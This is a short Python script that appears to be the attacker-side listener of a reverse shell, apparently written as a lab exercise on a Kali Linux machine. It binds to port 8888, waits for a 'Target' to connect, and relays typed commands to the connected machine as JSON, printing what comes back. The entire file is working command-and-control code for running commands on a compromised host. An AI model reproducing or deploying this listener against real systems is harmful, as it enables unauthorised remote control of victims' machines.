import os
import socket
import json

SERVER_IP = '192.168.64.8'  # IP of my Kali Linux machine
SERVER_PORT = 8888


def send(data):
    json_data = json.dumps(data)
    client_sock.send(json_data.encode())


def recv_command():
    data = ''
    while True:
        try:
            data = data + client_sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

# def get_info():
#   data = ''
#   data = data + client_ip[0] + 4*" " + client_ip[1] + 4*" " + os.name
#   return json.loads(data.decode())
    
def create_communication():
    while True:
        command = input(f'~{str(client_ip)}>>: ')
        send(command)
        if command == 'quit' or command == 'exit':
            break
        elif command[:3] == 'cd ':
            pass
        elif command == 'clear':
            os.system('clear')
        else:
            result = recv_command()
            print(result)


server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_sock.bind((SERVER_IP, SERVER_PORT))

print('[+] Listening For Incoming Connections....')
server_sock.listen(5)
client_sock, client_ip = server_sock.accept()
print(f'[+] Target Connected From: {str(client_ip)}')

create_communication()